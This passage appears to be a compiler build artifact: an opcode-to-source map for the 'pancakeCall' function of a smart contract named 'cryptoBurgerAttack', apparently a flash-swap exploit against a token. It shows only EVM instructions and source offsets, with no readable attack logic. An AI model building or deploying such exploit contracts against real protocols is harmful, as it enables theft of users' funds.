      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "DUP2",
      "path": "0"
    },
    "5300": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "DUP7",
      "path": "0"
    },
    "5301": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "GAS",
      "path": "0"
    },
    "5302": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "5303": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "5304": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "DUP1",
      "path": "0"
    },
    "5305": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "5306": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x14C7"
    },
    "5309": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "5310": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "5311": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "5313": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "DUP1",
      "path": "0"
    },
    "5314": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "5315": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "5316": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "5318": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "REVERT",
      "path": "0"
    },
    "5319": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "5320": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "POP",
      "path": "0"
    },
    "5321": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "POP",
      "path": "0"
    },
    "5322": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "POP",
      "path": "0"
    },
    "5323": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "POP",
      "path": "0"
    },
    "5324": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "5326": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "5327": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "5328": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "5330": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "DUP3",
      "path": "0"
    },
    "5331": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "5332": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "5334": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "5335": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5336": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "DUP2",
      "path": "0"
    },
    "5337": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "ADD",
      "path": "0"
    },
    "5338": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "5340": {
      "op": "NOT"
    },
    "5341": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "AND",
      "path": "0"
    },
    "5342": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "DUP3",
      "path": "0"
    },
    "5343": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "ADD",
      "path": "0"
    },
    "5344": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "5346": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "5347": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x14EF"
    },
    "5350": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "5351": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5352": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "DUP2",
      "path": "0"
    },
    "5353": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "ADD",
      "path": "0"
    },
    "5354": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5355": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2D0E"
    },
    "5358": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        7196,
        7303
      ],
      "op": "JUMP",
      "path": "0"
    },
    "5359": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7196,
        7303
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "5360": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7181,
        7303
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5361": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7181,
        7303
      ],
      "op": "POP",
      "path": "0"
    },
    "5362": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7313,
        7377
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 44,
      "value": "0x1525"
    },
    "5365": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5367": {
      "op": "DUP1"
    },
    "5368": {
      "op": "MLOAD"
    },
    "5369": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "5371": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "5374": {
      "op": "DUP4"
    },
    "5375": {
      "op": "CODECOPY"
    },
    "5376": {
      "op": "DUP2"
    },
    "5377": {
      "op": "MLOAD"
    },
    "5378": {
      "op": "SWAP2"
    },
    "5379": {
      "op": "MSTORE"
    },
    "5380": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5382": {
      "op": "DUP1"
    },
    "5383": {
      "op": "MLOAD"
    },
    "5384": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "5386": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "5389": {
      "op": "DUP4"
    },
    "5390": {
      "op": "CODECOPY"
    },
    "5391": {
      "op": "DUP2"
    },
    "5392": {
      "op": "MLOAD"
    },
    "5393": {
      "op": "SWAP2"
    },
    "5394": {
      "op": "MSTORE"
    },
    "5395": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7334,
        7346
      ],
      "op": "DUP4",
      "path": "0"
    },
    "5396": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7347,
        7348
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "5398": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7334,
        7349
      ],
      "op": "DUP2",
      "path": "0"
    },
    "5399": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7334,
        7349
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "5400": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7334,
        7349
      ],
      "op": "DUP2",
      "path": "0"
    },
    "5401": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7334,
        7349
      ],
      "op": "LT",
      "path": "0"
    },
    "5402": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7334,
        7349
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "5405": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7334,
        7349
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "5406": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7334,
        7349
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "5409": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7334,
        7349
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C93"
    },
    "5412": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        7334,
        7349
      ],
      "op": "JUMP",
      "path": "0"
    },
    "5413": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7313,
        7377
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "5414": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 45,
      "value": "0x40"
    },
    "5416": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "5417": {
      "op": "PUSH4",
      "value": "0x7C0329D"
    },
    "5422": {
      "op": "PUSH1",
      "value": "0xE2"
    },
    "5424": {
      "op": "SHL"
    },
    "5425": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "DUP2",
      "path": "0"
    },
    "5426": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "5427": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5429": {
      "op": "DUP1"
    },
    "5430": {
      "op": "MLOAD"
    },
    "5431": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "5433": {
      "op": "PUSH2",
      "value": "0x2FBE"
    },
    "5436": {
      "op": "DUP4"
    },
    "5437": {
      "op": "CODECOPY"
    },
    "5438": {
      "op": "DUP2"
    },
    "5439": {
      "op": "MLOAD"
    },
    "5440": {
      "op": "SWAP2"
    },
    "5441": {
      "op": "MSTORE"
    },
    "5442": {
      "offset": [
        526,
        568
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5443": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7452
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x1F00CA74"
    },
    "5448": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7452
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5449": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1558"
    },
    "5452": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5453": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7466,
        7481
      ],
      "op": "DUP7",
      "path": "0"
    },
    "5454": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7466,
        7481
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5455": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7495,
        7499
      ],
      "op": "DUP7",
      "path": "0"
    },
    "5456": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7495,
        7499
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5457": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "5459": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "ADD",
      "path": "0"
    },
    "5460": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2CED"
    },
    "5463": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        7402,
        7509
      ],
      "op": "JUMP",
      "path": "0"
    },
    "5464": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "5465": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "5467": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "5469": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "5470": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "DUP1",
      "path": "0"
    },
    "5471": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "DUP4",
      "path": "0"
    },
    "5472": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "SUB",
      "path": "0"
    },
    "5473": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "DUP2",
      "path": "0"
    },
    "5474": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "DUP7",
      "path": "0"
    },
    "5475": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "GAS",
      "path": "0"
    },
    "5476": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "5477": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "5478": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "DUP1",
      "path": "0"
    },
    "5479": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "5480": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1575"
    },
    "5483": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "5484": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "5485": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "5487": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "DUP1",
      "path": "0"
    },
    "5488": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "5489": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "5490": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "5492": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "REVERT",
      "path": "0"
    },
    "5493": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "5494": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "POP",
      "path": "0"
    },
    "5495": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "POP",
      "path": "0"
    },
    "5496": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "POP",
      "path": "0"
    },
    "5497": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "POP",
      "path": "0"
    },
    "5498": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "5500": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "5501": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "5502": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "5504": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "DUP3",
      "path": "0"
    },
    "5505": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "5506": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "5508": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "5509": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5510": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "DUP2",
      "path": "0"
    },
    "5511": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "ADD",
      "path": "0"
    },
    "5512": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "5514": {
      "op": "NOT"
    },
    "5515": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "AND",
      "path": "0"
    },
    "5516": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "DUP3",
      "path": "0"
    },
    "5517": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "ADD",
      "path": "0"
    },
    "5518": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "5520": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "5521": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x159D"
    },
    "5524": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "5525": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5526": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "DUP2",
      "path": "0"
    },
    "5527": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "ADD",
      "path": "0"
    },
    "5528": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5529": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2D0E"
    },
    "5532": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        7402,
        7509
      ],
      "op": "JUMP",
      "path": "0"
    },
    "5533": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7402,
        7509
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "5534": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7387,
        7509
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5535": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7387,
        7509
      ],
      "op": "POP",
      "path": "0"
    },
    "5536": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7519,
        7583
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 46,
      "value": "0x15D3"
    },
    "5539": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5541": {
      "op": "DUP1"
    },
    "5542": {
      "op": "MLOAD"
    },
    "5543": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "5545": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "5548": {
      "op": "DUP4"
    },
    "5549": {
      "op": "CODECOPY"
    },
    "5550": {
      "op": "DUP2"
    },
    "5551": {
      "op": "MLOAD"
    },
    "5552": {
      "op": "SWAP2"
    },
    "5553": {
      "op": "MSTORE"
    },
    "5554": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5556": {
      "op": "DUP1"
    },
    "5557": {
      "op": "MLOAD"
    },
    "5558": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "5560": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "5563": {
      "op": "DUP4"
    },
    "5564": {
      "op": "CODECOPY"
    },
    "5565": {
      "op": "DUP2"
    },
    "5566": {
      "op": "MLOAD"
    },
    "5567": {
      "op": "SWAP2"
    },
    "5568": {
      "op": "MSTORE"
    },
    "5569": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7540,
        7552
      ],
      "op": "DUP4",
      "path": "0"
    },
    "5570": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7553,
        7554
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "5572": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7540,
        7555
      ],
      "op": "DUP2",
      "path": "0"
    },
    "5573": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7540,
        7555
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "5574": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7540,
        7555
      ],
      "op": "DUP2",
      "path": "0"
    },
    "5575": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7540,
        7555
      ],
      "op": "LT",
      "path": "0"
    },
    "5576": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7540,
        7555
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "5579": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7540,
        7555
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "5580": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7540,
        7555
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "5583": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7540,
        7555
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C93"
    },
    "5586": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        7540,
        7555
      ],
      "op": "JUMP",
      "path": "0"
    },
    "5587": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7519,
        7583
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "5588": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 47,
      "value": "0x40"
    },
    "5590": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "5591": {
      "op": "PUSH4",
      "value": "0x7C0329D"
    },
    "5596": {
      "op": "PUSH1",
      "value": "0xE2"
    },
    "5598": {
      "op": "SHL"
    },
    "5599": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "DUP2",
      "path": "0"
    },
    "5600": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "5601": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "5603": {
      "op": "DUP1"
    },
    "5604": {
      "op": "MLOAD"
    },
    "5605": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "5607": {
      "op": "PUSH2",
      "value": "0x2FBE"
    },
    "5610": {
      "op": "DUP4"
    },
    "5611": {
      "op": "CODECOPY"
    },
    "5612": {
      "op": "DUP2"
    },
    "5613": {
      "op": "MLOAD"
    },
    "5614": {
      "op": "SWAP2"
    },
    "5615": {
      "op": "MSTORE"
    },
    "5616": {
      "offset": [
        526,
        568
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5617": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7658
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x1F00CA74"
    },
    "5622": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7658
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5623": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1606"
    },
    "5626": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5627": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7672,
        7687
      ],
      "op": "DUP7",
      "path": "0"
    },
    "5628": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7672,
        7687
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5629": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7701,
        7705
      ],
      "op": "DUP7",
      "path": "0"
    },
    "5630": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7701,
        7705
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "5631": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "5633": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "ADD",
      "path": "0"
    },
    "5634": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2CED"
    },
    "5637": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        7608,
        7715
      ],
      "op": "JUMP",
      "path": "0"
    },
    "5638": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "5639": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "5641": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        7608,
        7715
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
